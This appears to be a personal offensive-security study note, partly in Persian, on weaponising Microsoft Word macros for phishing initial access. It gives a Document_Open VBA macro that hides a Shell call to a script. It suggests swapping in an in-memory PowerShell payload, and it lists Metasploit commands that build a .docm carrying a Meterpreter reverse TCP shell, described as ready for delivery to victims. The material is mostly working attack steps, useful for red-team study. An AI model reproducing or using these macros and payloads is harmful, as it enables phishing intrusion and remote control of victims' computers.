[[VBA Macro Develoment]]
[[Automation Macro Development with macropack]]
[[VBA Macro Fundamentals]]


Code execution with VBA Macros

This technique will build a primitive word document that will auto execute the VBA Macros code once the Macros protection is disabled.

## 

	[](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/t1137-office-vba-macros#weaponization)

Weaponization

1. Create new word document (CTRL+N)
    
2. Hit ALT+F11 to go into Macro editor
    
3. Double click into the "This document" and CTRL+C/V the below:


کد ساده ماکرو 

```
Private Sub Document_Open()
  MsgBox "game over", vbOKOnly, "game over"
  a = Shell("C:\tools\shell.cmd", vbHide)
End Sub
```


حالا ما میتونیم بیایم و به جای اینکه بیایم و cmd  رو خالی خالی صدا بزنیم میتونیم بیایم Malisious Payload مون رو هم داخل پاورشل بزاریم و از طرف میتونیم بیایم و اون کامند رو اجرا کنیم به صورت inmemory  



---

همچنین ما میتونیم بیایم و از طریق metasploit ماکرو خودمون رو بسازیم 

```
exploit/multi/fileformat/office_word_macro    2012-01-10
use exploit/multi/fileformat/office_word_macro

set payload windows/x64/meterpreter/reverce_tcp

set lhost x.x.x.x
set lport 2222
 اختیاری set FILENAME document.docm

exploit 
```

![[Pasted image 20251101150330.png]]
فایل توی یک مسیر برای ما ساخته و اماده برای  delivery هست 